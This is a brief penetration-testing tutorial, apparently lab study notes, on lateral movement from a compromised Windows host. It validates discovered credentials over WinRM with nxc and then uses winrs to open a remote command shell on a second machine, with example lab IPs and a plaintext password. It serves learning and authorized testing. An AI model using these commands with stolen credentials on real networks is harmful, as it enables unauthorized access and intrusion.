### **When would you use WinRS?**

For example:
- You have compromised MS01.
- You discover credentials for Eric.
- Eric is authorised for remote management on MS02.
- MS02 has WinRM enabled.

You can move from MS01 to MS02 using WinRS or Evil-WinRM.
### **Step 1 — Check whether WinRM is available**

From Kali:
```
nxc winrm <TARGET_IP> -u USER -p PASSWORD
```
Example:
```
nxc winrm 192.168.245.174 -u Eric.Wallows -p 'EricLikesRunning800'
```

A successful authentication check indicates that the credentials were accepted by WinRM. It does not necessarily guarantee that every PowerShell remoting endpoint will permit your session.
### **Step 2 — Connect from Windows**

From a Windows machine:
```
winrs -r:<TARGET_HOSTNAME> -u:<DOMAIN>\<USER> -p:<PASSWORD> cmd
```
Example:
```
winrs -r:MS02.laser.com -u:laser\Eric.Wallows -p:EricLikesRunning800 cmd
```

You now have a remote command prompt on MS02.

You can execute individual commands too:
```
winrs -r:MS02.laser.com hostname
```